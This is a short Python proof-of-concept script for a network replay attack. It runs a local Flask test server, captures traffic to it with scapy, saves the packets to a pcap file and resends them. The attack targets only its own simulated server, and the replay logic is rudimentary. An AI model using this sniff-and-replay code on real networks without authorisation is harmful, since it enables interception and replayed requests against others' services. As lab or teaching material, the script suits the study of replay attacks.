import socket
import time
from scapy.all import sniff, send, conf, wrpcap, PacketList
import os
# from scapy.layers.inet import IP, TCP

# Step 1: Simulate a target server
from flask import Flask, request, jsonify

def start_server():
    app = Flask(__name__)

    @app.route('/api', methods=['POST'])
    def api_endpoint():
        data = request.get_json()
        return jsonify({"received": data, "status": "success"}), 200

    app.run(host='127.0.0.1', port=8080)

# Step 2: Capture packets targeting the server
def capture_packets(filter_expression, output_file, capture_duration=10):
    print("Capturing packets...")
    conf.L3socket = conf.L3socket
    packets = sniff(filter=filter_expression, timeout=capture_duration)
    if len(packets) > 0:
        packets = PacketList(packets)
        packets.summary()
        packets[0].show()
        print(f"Captured {len(packets)} packets. Writing to file...")
        wrpcap(output_file, packets)
        print(f"Packets saved to {output_file}.")
    else:
        print("No packets captured.")

# Step 3: Replay packets
def replay_packets(input_file):
    print(f"Replaying packets from {input_file}...")
    conf.L3socket = conf.L3socket
    packets = sniff(offline=input_file)
    for pkt in packets:
        send(pkt)
        print(f"Replayed packet: {pkt.summary()}")
        time.sleep(1)

if __name__ == "__main__":
    import argparse
    from threading import Thread

    parser = argparse.ArgumentParser(description="Replay Attack PoC")
    parser.add_argument('mode', choices=['server', 'capture', 'replay'], help="Mode of operation")
    parser.add_argument('--filter', type=str, default="tcp and port 8080", help="Filter expression for packet capture")
    parser.add_argument('--file', type=str, default=os.path.join(os.getcwd(), "packets.pcap"), help="File to save or load packets")
    parser.add_argument('--duration', type=int, default=10, help="Capture duration in seconds")

    args = parser.parse_args()

    if args.mode == 'server':
        print("Starting the target server...")
        start_server()

    elif args.mode == 'capture':
        capture_packets(args.filter, args.file, args.duration)

    elif args.mode == 'replay':
        replay_packets(args.file)